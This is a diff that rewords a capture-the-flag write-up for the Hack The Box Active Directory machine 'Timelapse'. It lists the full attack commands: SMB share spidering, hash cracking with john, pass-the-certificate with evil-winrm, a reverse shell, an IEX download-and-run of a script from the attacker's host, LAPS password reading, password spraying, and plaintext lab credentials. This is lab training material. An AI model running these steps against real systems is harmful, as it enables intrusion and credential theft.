@@ -20,21 +20,21 @@ aliases:
 
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-Once we have the ports, we will do another `nmap` going more in detail
+With the ports in hand, I'll run a second, more detailed `nmap` scan.
 
 ```
 nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692
@@ -113,7 +113,7 @@ Host script results:
 ```
 
 
-After some enumeration we can access some shares as `Guest`
+After some enumeration, we can access a few shares as `Guest`.
 
 ```
 netexec smb $T -u 'guest' -p '' --shares
@@ -121,7 +121,7 @@ netexec smb $T -u 'guest' -p '' --shares
 
 ![](../../0.%20Assets/Timelapse-1791302580600.webp)
 
-Let's retrieve everything
+Let's pull down everything.
 
 ```
 netexec smb "$T" -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
@@ -129,11 +129,11 @@ netexec smb "$T" -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FO
 
 ![](../../0.%20Assets/Timelapse-1791302668914.webp)
 
-if we try to unzip
+When we try to unzip it, it asks for a password.
 
 ![](../../0.%20Assets/Timelapse-1791302697185.webp)
 
-Let's convert the zip into a hash for later cracking with `john`
+Let's convert the zip into a hash so we can crack it with `john`.
 
 ```
 john --wordlist=rockyou.txt hash.txt
@@ -141,7 +141,7 @@ john --wordlist=rockyou.txt hash.txt
 
 ![](../../0.%20Assets/Timelapse-1791302780877.webp)
 
-now let's crack 
+Now let's crack it.
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
@@ -149,15 +149,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
 
 ![](../../0.%20Assets/Timelapse-1791302808276.webp)
 
-Once we unzip the file
+Once we unzip the file:
 
 ![](../../0.%20Assets/Timelapse-1791302930021.webp)
 
-we find a `.pfx` key
+We find a `.pfx` key.
 
 https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/active-directory-pentesting/crendentials/pfx-file.md
 
-I tried extracting the private key from the PFX file but i needed a password  so let's crack it
+I tried extracting the private key from the PFX file, but it needed a password, so let's crack that too.
 
 ![](../../0.%20Assets/Timelapse-1791303091222.webp)
 
@@ -169,13 +169,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
 
 ![](../../0.%20Assets/Timelapse-1791303114034.webp)
 
-So now we get the private key
+Now we can extract the private key.
 
 ```
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out drlive.key
 ```
 
-and the certificate
+And the certificate.
 
 ```
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out drlive.crt
@@ -183,7 +183,7 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out drlive.crt
 
 ![](../../0.%20Assets/Timelapse-1791304557362.webp)
 
-And now we can perform a `pass the certificate` ! (I personally think this is very cool) and we are using evil-winrm (there is also a hint [winrm_backup...])
+Now we can perform a `pass the certificate`, which I think is a really neat technique, using evil-winrm. There's also a hint in the filename (winrm_backup...).
 
 ```
 evil-winrm -i 10.129.227.113 -c drlive.crt -k drlive.key -S
@@ -191,19 +191,19 @@ evil-winrm -i 10.129.227.113 -c drlive.crt -k drlive.key -S
 
 ![](../../0.%20Assets/Timelapse-1791309992531.webp)
 
-And there we go first flag.
+And there's the first flag.
 
-It is very uncomfortable to have to write the password all the time so we will get a reverse shell
+Typing the password every time gets tedious, so let's grab a reverse shell.
 
 ```
 penelope -O -p 1337 -a -i tun0
 ```
 
-This will generate the powershell payload to receive the shell
+This generates the PowerShell payload to catch the shell.
 
 ![](../../0.%20Assets/Timelapse-1791310070180.webp)
 
-I will run `PrivescCheck` and generate an HTML so we can download it and comfortably have a review of what is going on in the machine for privilege escalation 
+I'll run `PrivescCheck` and output HTML so we can download it and comfortably review the machine's privilege escalation surface.
 
 ```
 powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.226/PrivescCheck.ps1'); Invoke-Pri
@@ -213,15 +213,15 @@ vescCheck -Extended -Audit -Report PrivescCheck_Full -Format HTML"
 
 ![](../../0.%20Assets/Timelapse-1791311288443.webp)
 
-Regardless from the summary we can have an idea of what to expect.
+Even the summary gives us a good idea of what to expect.
 
-I recommend starting a python server and opening the HTML file.
+I'd recommend starting a Python server and opening the HTML file.
 
 ![](../../0.%20Assets/Timelapse-1791311620026.webp)
 
-And none of the results was really super critical or something really exploitable
+None of the results were especially critical or easily exploitable.
 
-Going over my notes I tried a couple stuff and the history of powershell was the hit
+Going back over my notes, I tried a few things, and the PowerShell history was the one that paid off.
 
 ```
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -233,9 +233,9 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 E3R$Q62^12p7PLlC%KWaxuaV
 ```
 
-We have a password we need users to test the password with
+We have a password, now we need users to test it against.
 
-I found that the user `Guest` can `rid brute`
+I found that the `Guest` user can `rid brute`.
 
 ```
 netexec smb $T -u 'guest' -p '' --rid-brute 10000
@@ -255,7 +255,7 @@ nxc smb "$T" -u users.txt -p 'E3R$Q62^12p7PLlC%KWaxuaV'
 
 ![](../../0.%20Assets/Timelapse-1791312146694.webp)
 
-Great we have a set of credentials let's see what we can do with them
+Now we have a set of credentials. Let's see what they get us.
 
 ```
 ./nxcspray all $T -u 'svc_deploy'  -p 'E3R$Q62^12p7PLlC%KWaxuaV'
@@ -263,7 +263,7 @@ Great we have a set of credentials let's see what we can do with them
 
 ![](../../0.%20Assets/Timelapse-1791312235184.webp)
 
-Seems like we can log in through `evil-winrm` using `ssl`
+It looks like we can log in through `evil-winrm` over `ssl`.
 
 ```
 evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
@@ -272,7 +272,7 @@ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 
 ![](../../0.%20Assets/Timelapse-1791312362882.webp)
 
-and doing `whoami /all` we see a dangerous group
+Running `whoami /all`, we see a dangerous group.
 
 ![](../../0.%20Assets/Timelapse-1791312419336.webp)
 
@@ -282,7 +282,7 @@ Get-ADComputer -Identity 'DC01' -property 'ms-mcs-admpwd'
 
 ![](../../0.%20Assets/Timelapse-1791312557049.webp)
 
-save this credential in a file and password spray it against the users we found before
+Save this credential to a file and password spray it against the users we found earlier.
 
 ```
 netexec winrm $T -u users.txt -p password.txt --continue-on-success
@@ -291,12 +291,12 @@ netexec winrm $T -u users.txt -p password.txt --continue-on-success
 
 ![](../../0.%20Assets/Timelapse-1791312619187.webp)
 
-connect with evil-winrm
+Connect with evil-winrm.
 
 ```
 evil-winrm -i 10.129.227.113 -u administrator -p '6f+m%vqtbL6ZHr4%xfyHp206' -S
 ```
 
-And for some reason the flag was not in the desktop of the administrator but in the `TRX` user
+For some reason the flag wasn't on the administrator's desktop, but on the `TRX` user's.
 
 ![](../../0.%20Assets/Timelapse-1791312820510.webp)
